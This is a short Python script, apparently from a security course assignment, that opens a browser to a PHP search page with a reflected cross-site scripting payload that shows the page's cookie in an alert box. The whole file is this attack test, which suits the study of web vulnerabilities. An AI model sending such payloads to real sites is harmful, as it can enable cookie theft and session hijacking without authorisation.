import webbrowser

url = "http://www.wsb.com/Assignment2/case12.php?searchterm=<script>alert(document.cookie)</script>"
new = 2
webbrowser.open(url, new)